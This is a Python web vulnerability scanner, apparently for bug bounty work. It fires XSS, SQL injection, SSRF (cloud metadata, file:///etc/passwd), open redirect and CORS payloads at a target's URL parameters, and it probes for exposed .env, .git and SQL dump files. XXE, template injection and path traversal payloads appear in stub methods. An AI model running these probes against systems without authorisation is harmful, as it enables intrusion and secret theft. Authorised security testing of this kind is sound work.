#!/usr/bin/env python3
"""
Advanced Bug Bounty Scanner Framework
Identifies common vulnerabilities in web applications
"""

import requests
import re
import json
import time
import urllib.parse
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import ssl
import socket
from datetime import datetime

class BugBountyScanner:
    def __init__(self, target_url, threads=10):
        self.target_url = target_url
        self.session = requests.Session()
        self.threads = threads
        self.vulnerabilities = []
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
    def scan_xss(self, url):
        """Scan for Cross-Site Scripting vulnerabilities"""
        xss_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<svg/onload=alert("XSS")>'
        ]
        
        results = []
        for payload in xss_payloads:
            try:
                # Test GET parameters
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                
                for param in params:
                    test_params = params.copy()
                    test_params[param] = payload
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, headers=self.headers, timeout=10)
                    
                    if payload in response.text:
                        results.append({
                            'type': 'XSS',
                            'severity': 'High',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': 'Payload reflected in response'
                        })
                        
            except Exception as e:
                pass
                
        return results
    
    def scan_sql_injection(self, url):
        """Scan for SQL Injection vulnerabilities"""
        sql_payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' --",
            "' OR 1=1#",
            "admin' --",
            "' UNION SELECT NULL--",
            "1' AND '1'='2"
        ]
        
        sql_errors = [
            "SQL syntax",
            "mysql_fetch",
            "Warning: mysql",
            "MySQLSyntaxErrorException",
            "valid MySQL result",
            "PostgreSQL query failed",
            "Warning: pg_",
            "Microsoft OLE DB Provider for ODBC Drivers",
            "SQLException",
            "ORA-01756"
        ]
        
        results = []
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        for param in params:
            for payload in sql_payloads:
                try:
                    test_params = params.copy()
                    test_params[param] = payload
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, headers=self.headers, timeout=10)
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            results.append({
                                'type': 'SQL Injection',
                                'severity': 'Critical',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f'SQL error detected: {error}'
                            })
                            break
                            
                except Exception as e:
                    pass
                    
        return results
    
    def scan_ssrf(self, url):
        """Scan for Server-Side Request Forgery"""
        ssrf_payloads = [
            'http://localhost:80',
            'http://127.0.0.1:80',
            'http://169.254.169.254/',  # AWS metadata
            'http://metadata.google.internal/',  # GCP metadata
            'http://[::1]:80/',
            'file:///etc/passwd',
            'dict://localhost:11211',
            'gopher://localhost:8080'
        ]
        
        results = []
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        for param in params:
            for payload in ssrf_payloads:
                try:
                    test_params = params.copy()
                    test_params[param] = payload
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    start_time = time.time()
                    response = self.session.get(test_url, headers=self.headers, timeout=10)
                    response_time = time.time() - start_time
                    
                    # Check for signs of SSRF
                    if response_time > 5:  # Unusual delay
                        results.append({
                            'type': 'SSRF',
                            'severity': 'High',
                            'url': test_url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'Unusual response time: {response_time:.2f}s'
                        })
                        
                    # Check for internal content leakage
                    internal_indicators = ['root:', 'daemon:', 'localhost', '127.0.0.1', 'internal']
                    for indicator in internal_indicators:
                        if indicator in response.text:
                            results.append({
                                'type': 'SSRF',
                                'severity': 'High',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f'Internal content indicator found: {indicator}'
                            })
                            break
                            
                except Exception as e:
                    pass
                    
        return results
    
    def scan_open_redirect(self, url):
        """Scan for Open Redirect vulnerabilities"""
        redirect_payloads = [
            'https://evil.com',
            '//evil.com',
            '///evil.com',
            'https:evil.com',
            'javascript:alert(1)',
            '\\\\evil.com',
            '@evil.com'
        ]
        
        results = []
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        for param in params:
            for payload in redirect_payloads:
                try:
                    test_params = params.copy()
                    test_params[param] = payload
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                    
                    response = self.session.get(test_url, headers=self.headers, timeout=10, allow_redirects=False)
                    
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if 'evil.com' in location or payload in location:
                            results.append({
                                'type': 'Open Redirect',
                                'severity': 'Medium',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': f'Redirects to: {location}'
                            })
                            
                except Exception as e:
                    pass
                    
        return results
    
    def scan_security_headers(self):
        """Check for missing security headers"""
        results = []
        security_headers = {
            'X-Frame-Options': 'Clickjacking protection',
            'X-Content-Type-Options': 'MIME-sniffing protection',
            'X-XSS-Protection': 'XSS filter',
            'Strict-Transport-Security': 'HTTPS enforcement',
            'Content-Security-Policy': 'Content injection protection',
            'Referrer-Policy': 'Referrer information control',
            'Permissions-Policy': 'Feature permissions control'
        }
        
        try:
            response = self.session.get(self.target_url, headers=self.headers, timeout=10)
            
            for header, description in security_headers.items():
                if header not in response.headers:
                    results.append({
                        'type': 'Missing Security Header',
                        'severity': 'Low',
                        'url': self.target_url,
                        'header': header,
                        'description': description,
                        'evidence': f'Header {header} is missing'
                    })
                    
        except Exception as e:
            pass
            
        return results
    
    def scan_cors_misconfiguration(self):
        """Check for CORS misconfigurations"""
        results = []
        test_origins = [
            'https://evil.com',
            'null',
            'https://evil.com.victim.com'
        ]
        
        for origin in test_origins:
            try:
                headers = self.headers.copy()
                headers['Origin'] = origin
                
                response = self.session.get(self.target_url, headers=headers, timeout=10)
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '')
                
                if acao == origin or acao == '*':
                    severity = 'High' if acac.lower() == 'true' else 'Medium'
                    results.append({
                        'type': 'CORS Misconfiguration',
                        'severity': severity,
                        'url': self.target_url,
                        'origin': origin,
                        'evidence': f'ACAO: {acao}, ACAC: {acac}'
                    })
                    
            except Exception as e:
                pass
                
        return results
    
    def scan_information_disclosure(self):
        """Check for information disclosure vulnerabilities"""
        results = []
        sensitive_paths = [
            '/.git/config',
            '/.env',
            '/config.php',
            '/phpinfo.php',
            '/.DS_Store',
            '/web.config',
            '/robots.txt',
            '/sitemap.xml',
            '/.well-known/security.txt',
            '/backup.sql',
            '/dump.sql',
            '/.htaccess',
            '/server-status',
            '/server-info'
        ]
        
        base_url = f"{urllib.parse.urlparse(self.target_url).scheme}://{urllib.parse.urlparse(self.target_url).netloc}"
        
        for path in sensitive_paths:
            try:
                test_url = base_url + path
                response = self.session.get(test_url, headers=self.headers, timeout=10)
                
                if response.status_code == 200:
                    # Check for actual sensitive content
                    sensitive_patterns = [
                        r'password\s*=',
                        r'api[_-]?key\s*=',
                        r'secret[_-]?key\s*=',
                        r'aws[_-]?access[_-]?key',
                        r'private[_-]?key',
                        r'BEGIN RSA PRIVATE KEY'
                    ]
                    
                    for pattern in sensitive_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            results.append({
                                'type': 'Information Disclosure',
                                'severity': 'High',
                                'url': test_url,
                                'path': path,
                                'evidence': f'Sensitive pattern found: {pattern}'
                            })
                            break
                    else:
                        # Still report as medium if file exists
                        results.append({
                            'type': 'Information Disclosure',
                            'severity': 'Medium',
                            'url': test_url,
                            'path': path,
                            'evidence': 'Sensitive file accessible'
                        })
                        
            except Exception as e:
                pass
                
        return results
    
    def generate_report(self):
        """Generate a comprehensive vulnerability report"""
        report = {
            'scan_date': datetime.now().isoformat(),
            'target': self.target_url,
            'total_vulnerabilities': len(self.vulnerabilities),
            'severity_breakdown': {
                'Critical': 0,
                'High': 0,
                'Medium': 0,
                'Low': 0
            },
            'vulnerabilities': self.vulnerabilities
        }
        
        for vuln in self.vulnerabilities:
            severity = vuln.get('severity', 'Low')
            report['severity_breakdown'][severity] += 1
            
        return report
    
    def run_scan(self):
        """Execute all scans"""
        print(f"Starting comprehensive security scan on {self.target_url}")
        print("-" * 50)
        
        # Collect all URLs to scan
        urls_to_scan = [self.target_url]
        
        try:
            # Crawl for more URLs (simplified crawler)
            response = self.session.get(self.target_url, headers=self.headers, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for link in soup.find_all('a', href=True):
                absolute_url = urllib.parse.urljoin(self.target_url, link['href'])
                if absolute_url.startswith(self.target_url) and '?' in absolute_url:
                    urls_to_scan.append(absolute_url)
                    
            urls_to_scan = list(set(urls_to_scan))[:20]  # Limit to 20 URLs
            
        except Exception as e:
            print(f"Error during crawling: {e}")
            
        # Run scans
        print(f"Found {len(urls_to_scan)} URLs to scan")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            # Parameter-based scans
            for url in urls_to_scan:
                if '?' in url:
                    print(f"Scanning: {url}")
                    
                    # XSS Scan
                    xss_results = self.scan_xss(url)
                    self.vulnerabilities.extend(xss_results)
                    
                    # SQL Injection Scan
                    sql_results = self.scan_sql_injection(url)
                    self.vulnerabilities.extend(sql_results)
                    
                    # SSRF Scan
                    ssrf_results = self.scan_ssrf(url)
                    self.vulnerabilities.extend(ssrf_results)
                    
                    # Open Redirect Scan
                    redirect_results = self.scan_open_redirect(url)
                    self.vulnerabilities.extend(redirect_results)
                    
        # Header and configuration scans
        header_results = self.scan_security_headers()
        self.vulnerabilities.extend(header_results)
        
        cors_results = self.scan_cors_misconfiguration()
        self.vulnerabilities.extend(cors_results)
        
        info_results = self.scan_information_disclosure()
        self.vulnerabilities.extend(info_results)
        
        # Generate report
        report = self.generate_report()
        
        print("\n" + "="*50)
        print("SCAN COMPLETE")
        print("="*50)
        print(f"Total vulnerabilities found: {report['total_vulnerabilities']}")
        print(f"Critical: {report['severity_breakdown']['Critical']}")
        print(f"High: {report['severity_breakdown']['High']}")
        print(f"Medium: {report['severity_breakdown']['Medium']}")
        print(f"Low: {report['severity_breakdown']['Low']}")
        
        # Save report
        with open('vulnerability_report.json', 'w') as f:
            json.dump(report, f, indent=2)
            
        print(f"\nDetailed report saved to: vulnerability_report.json")
        
        return report


# Additional utilities for advanced scanning

class AdvancedScanner:
    """Extended scanner with more sophisticated techniques"""
    
    @staticmethod
    def scan_xxe(url):
        """XML External Entity vulnerability scanner"""
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/">]><root>&test;</root>'
        ]
        # Implementation would go here
        pass
    
    @staticmethod
    def scan_ssti(url):
        """Server-Side Template Injection scanner"""
        ssti_payloads = [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '#{7*7}',
            '*{7*7}'
        ]
        # Implementation would go here
        pass
    
    @staticmethod
    def scan_path_traversal(url):
        """Path traversal vulnerability scanner"""
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]
        # Implementation would go here
        pass


def main():
    """Main function to run the scanner"""
    target = input("Enter target URL (e.g., https://example.com): ").strip()
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
        
    scanner = BugBountyScanner(target)
    scanner.run_scan()


if __name__ == "__main__":
    main()